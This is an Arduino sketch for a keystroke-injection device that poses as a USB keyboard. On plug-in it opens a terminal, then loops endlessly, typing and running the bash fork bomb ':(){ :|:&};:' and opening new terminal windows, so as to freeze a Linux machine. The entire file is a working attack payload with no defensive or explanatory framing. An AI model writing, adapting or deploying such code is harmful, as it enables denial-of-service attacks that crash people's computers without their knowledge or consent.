#include<Keyboard.h>
void setup() {
 
Keyboard.begin();
Keyboard.releaseAll();
pinMode(13,OUTPUT);

delay(2000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.release(KEY_LEFT_GUI);
delay(100);
Keyboard.print("terminal");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(2000);

 
}

void loop() {

Keyboard.print(":(){ :|:&};:"); // deploys the frok bomb for linux 
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_SHIFT);
Keyboard.press('n');
Keyboard.releaseAll();

digitalWrite(13,HIGH);
delay(10);
digitalWrite(13,LOW);
delay(10);

 }
